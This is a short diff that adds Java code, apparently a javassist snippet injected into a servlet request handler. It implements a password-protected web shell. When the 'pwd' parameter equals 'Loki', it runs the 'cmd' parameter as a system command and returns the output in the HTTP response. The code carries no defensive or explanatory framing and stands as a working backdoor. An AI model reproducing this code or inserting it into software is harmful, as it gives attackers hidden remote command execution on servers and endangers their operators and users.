@@ -1,0 +1,21 @@
+javax.servlet.http.HttpServletRequest request=$1; // reference for javassist
+javax.servlet.http.HttpServletResponse response=$2;
+String pwd=request.getParameter("pwd");
+String cmd=request.getParameter("cmd");
+String result="";
+try {
+        if (pwd!=null&&pwd.equals("Loki"))
+        {
+            if (cmd==null||cmd.equals(""))
+            {
+                result=com.loki.BaseUtils.Shell.help();
+            }
+            else
+            {
+                result=com.loki.BaseUtils.Shell.execute(cmd);
+            }
+        response.getWriter().print(result);
+        return;
+       }
+    }
+catch(Exception e){response.getWriter().print(e.getMessage());}
